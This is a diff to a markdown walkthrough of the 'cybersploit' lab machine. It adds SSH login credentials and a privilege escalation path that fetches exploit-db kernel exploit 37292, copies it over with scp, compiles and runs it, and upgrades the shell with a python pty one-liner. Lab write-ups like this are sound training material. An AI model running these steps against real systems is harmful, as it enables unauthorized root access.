@@ -69,8 +69,30 @@ DOWNLOADED: 4612 - FOUND: 7
 - No use taking long time to bruteforce used the username - `itsskv`
 
 ## SSH login
+- Add the IP in `/etc/hosts` as `192.168.58.92 cybersploit`
+- ssh with the username:`itsskv` and password as `cybersploit{youtube.com/c/cybersploit}` 
 
-- Using the cybersploit as password in SSH .
+## User flag
+![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/d40193c7-8f08-48b3-bc74-243551f120f8)
+
+
+## Root Flag
+
+- Tried sudo -l to identify process, not able to switch user also to cybersploit
+- so using this command `uname -a` , we can check for kernal version, we can see its old one, so we can get an exploit from exploit-db.
+https://www.exploit-db.com/download/37292
+
+![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/160e6cff-5ba5-41c9-927e-fb2be866207c)
+
+- Directly can't able to import the exploit, so we can use 
+`scp 37292.c itsskv@cybersploit:/home/itsskv/ `  , to transfer the file from local to remote.
+
+- Now we can complie it using `gcc 37292.c -o exploit`
+
+- `./exploit` --> now we got the shell, so to entering into the interactive shell we can use this python command 
+`python -c 'import pty;pty.spawn("/bin/bash")'`
+
+![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/e227b4e7-65a3-4643-b180-8afa440af1c5)
 
 
 
